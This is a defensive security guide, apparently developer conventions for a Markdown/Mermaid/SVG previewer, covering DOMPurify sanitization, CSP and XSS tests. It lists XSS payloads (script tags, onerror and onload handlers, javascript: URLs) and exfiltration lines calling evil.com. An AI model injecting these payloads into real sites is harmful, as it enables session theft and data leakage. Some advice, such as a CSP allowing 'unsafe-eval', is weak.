# Security and Sanitization Patterns

## Rules and Conventions

### 1. Core Security Principle

**NEVER inject untrusted content without sanitization.**

All user-generated content (Markdown, Mermaid, SVG) must pass through DOMPurify before rendering.

### 2. Sanitization Functions

Located in `lib/sanitize/sanitize.ts`:

```typescript
import DOMPurify from 'dompurify';

// For HTML content (Markdown output)
export function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'p', 'br', 'hr',
      'ul', 'ol', 'li',
      'strong', 'em', 'code', 'pre',
      'a', 'img',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'blockquote',
      'div', 'span',
    ],
    ALLOWED_ATTR: [
      'href', 'src', 'alt', 'title',
      'class', 'id',
      'width', 'height',
      'colspan', 'rowspan',
    ],
    ALLOW_DATA_ATTR: false,
  });
}

// For SVG content (Mermaid output, raw SVG)
export function sanitizeSvg(svg: string): string {
  return DOMPurify.sanitize(svg, {
    USE_PROFILES: { svg: true, svgFilters: true },
    ADD_TAGS: ['foreignObject'],  // Mermaid uses this
    ALLOW_DATA_ATTR: false,
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
  });
}
```

### 3. When to Sanitize

**Before any of these operations:**
- Rendering to DOM via `dangerouslySetInnerHTML`
- Exporting to file (SVG, PDF, PNG)
- Sharing via URL
- Displaying in preview pane

**Pattern:**
```typescript
// ✅ Good
const rawHtml = await renderMarkdown(content);
const sanitized = sanitizeHtml(rawHtml);
return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;

// ❌ Bad
const rawHtml = await renderMarkdown(content);
return <div dangerouslySetInnerHTML={{ __html: rawHtml }} />;  // No sanitization!
```

## Common XSS Attack Vectors

### 1. Script Injection

```markdown
<!-- Attacker input -->
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>
```

**Protection:**
- DOMPurify removes `<script>` tags
- Event handlers (`onerror`, `onclick`) are stripped
- `javascript:` protocol is blocked

### 2. SVG-Based XSS

```svg
<!-- Attacker input -->
<svg onload="alert('XSS')">
<svg><script>alert('XSS')</script></svg>
<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>
```

**Protection:**
- `sanitizeSvg` uses SVG profile
- Removes event handlers
- Blocks `<script>` in SVG context

### 3. Data Exfiltration

```html
<!-- Attacker input -->
<img src="https://evil.com/steal?data=...">
<link rel="stylesheet" href="https://evil.com/steal.css">
```

**Protection:**
- Not blocked by default (images are allowed for Markdown)
- Consider Content Security Policy (CSP) in production

## Security Boundaries

### 1. Rendering Layer

All renderers sanitize their output:

```typescript
// renderMarkdown.ts
export async function renderMarkdown(content: string) {
  const html = await unified()...process(content);
  return { html: sanitizeHtml(String(html)) };  // Always sanitize
}

// renderMermaid.ts
export async function renderMermaid(content: string) {
  const { svg } = await mermaid.render(id, content);
  return { html: sanitizeSvg(svg) };  // Always sanitize
}

// renderSvg.ts
export async function renderSvg(content: string) {
  return { html: sanitizeSvg(content) };  // Always sanitize
}
```

### 2. Export Layer

Sanitize before exporting:

```typescript
// lib/export/exportSvg.ts
export async function exportSvg(element: HTMLElement): Promise<string> {
  const svg = element.querySelector('svg')?.outerHTML || '';
  return sanitizeSvg(svg);  // Sanitize before export
}
```

### 3. Share Layer

State is compressed but not sanitized until render:

```typescript
// lib/share/codec.ts
export function encodeState(state: DocState): string {
  // Just encode, don't sanitize (content is raw)
  return LZString.compressToBase64(JSON.stringify(state));
}

// Sanitization happens at render time
const { html } = await renderX(state.content, state.theme);  // Sanitized in renderer
```

## React JSX Escaping

React automatically escapes text content:

```typescript
// ✅ Safe: React escapes text
<div>{userInput}</div>  // XSS-safe

// ⚠️ Unsafe: Bypasses React escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // Needs sanitization!

// ✅ Safe: Sanitized before injection
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(userInput) }} />
```

## Content Security Policy (CSP)

**Recommended for Phase 2+ (production):**

```typescript
// next.config.js
const cspHeader = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  frame-src 'none';
`;

module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: cspHeader.replace(/\n/g, ''),
          },
        ],
      },
    ];
  },
};
```

## Testing Security

### 1. XSS Prevention Tests

```typescript
// tests/sanitize.test.ts
import { sanitizeHtml, sanitizeSvg } from '@/lib/sanitize/sanitize';

describe('sanitizeHtml', () => {
  it('should remove script tags', () => {
    const malicious = '<script>alert("xss")</script><p>Safe content</p>';
    const safe = sanitizeHtml(malicious);

    expect(safe).not.toContain('<script>');
    expect(safe).toContain('<p>Safe content</p>');
  });

  it('should remove event handlers', () => {
    const malicious = '<img src="x" onerror="alert(\'xss\')">';
    const safe = sanitizeHtml(malicious);

    expect(safe).not.toContain('onerror');
  });

  it('should block javascript: protocol', () => {
    const malicious = '<a href="javascript:alert(\'xss\')">Click</a>';
    const safe = sanitizeHtml(malicious);

    expect(safe).not.toContain('javascript:');
  });
});

describe('sanitizeSvg', () => {
  it('should remove script in SVG', () => {
    const malicious = '<svg><script>alert("xss")</script></svg>';
    const safe = sanitizeSvg(malicious);

    expect(safe).not.toContain('<script>');
  });

  it('should remove onload handlers', () => {
    const malicious = '<svg onload="alert(\'xss\')"></svg>';
    const safe = sanitizeSvg(malicious);

    expect(safe).not.toContain('onload');
  });
});
```

### 2. Integration Tests

```typescript
// tests/renderMarkdown.test.ts
import { renderMarkdown } from '@/components/preview/renderers/renderMarkdown';

describe('renderMarkdown XSS protection', () => {
  it('should sanitize XSS in Markdown', async () => {
    const malicious = `
# Title
<script>alert('xss')</script>
<img src=x onerror="alert('xss')">
`;

    const { html } = await renderMarkdown(malicious, 'dark');

    expect(html).not.toContain('<script>');
    expect(html).not.toContain('onerror');
    expect(html).toContain('<h1>Title</h1>');
  });
});
```

## Patterns to Follow

### 1. Defense in Depth

Layer multiple security mechanisms:

1. **Input validation** - Check format before processing
2. **Sanitization** - DOMPurify removes dangerous content
3. **React escaping** - Automatic for text content
4. **CSP** - Browser-level protection (Phase 2+)

### 2. Allowlist, Not Blocklist

```typescript
// ✅ Good: Allowlist known-safe tags
ALLOWED_TAGS: ['p', 'h1', 'h2', 'strong', 'em']

// ❌ Bad: Blocklist known-dangerous tags
FORBIDDEN_TAGS: ['script', 'iframe']  // Easy to bypass
```

### 3. Sanitize at Boundaries

Sanitize at system boundaries (render, export, display):

```
User Input → Parser → Renderer → **SANITIZE** → Display
                                 **SANITIZE** → Export
```

## Anti-Patterns (Avoid)

1. **Don't trust any user input**
```typescript
// ❌ Bad: Assuming input is safe
if (isTrustedUser) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// ✅ Good: Always sanitize
return <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(content) }} />;
```

2. **Don't sanitize on client-side only**
```typescript
// ❌ Bad: Client-side only (can be bypassed)
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(content) }} />

// ✅ Good: Sanitize in renderer (server or client)
const { html } = await renderMarkdown(content);  // Sanitized in renderer
<div dangerouslySetInnerHTML={{ __html: html }} />
```

3. **Don't use regex for sanitization**
```typescript
// ❌ Bad: Regex is easily bypassed
const sanitized = content.replace(/<script>/g, '');  // Bypassed by <ScRiPt>

// ✅ Good: Use DOMPurify
const sanitized = sanitizeHtml(content);
```

4. **Don't disable sanitization features**
```typescript
// ❌ Bad
DOMPurify.sanitize(html, { SAFE_FOR_TEMPLATES: true });  // Less safe

// ✅ Good
DOMPurify.sanitize(html);  // Use defaults
```

## Security Checklist

Before adding new features:

- [ ] All user content passes through sanitization
- [ ] No `dangerouslySetInnerHTML` without sanitization
- [ ] XSS test cases added
- [ ] No `eval()` or `new Function()`
- [ ] No `javascript:` protocol in links
- [ ] Event handlers are stripped
- [ ] Security implications documented

## Related Files

- `lib/sanitize/sanitize.ts` - Sanitization utilities
- `components/preview/renderers/` - Sanitization at render
- `lib/export/` - Sanitization at export
- `docs/ARCHITECTURE.md` - Security boundaries

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [React Security Best Practices](https://react.dev/learn/escape-hatches#dangerously-set-inner-html)
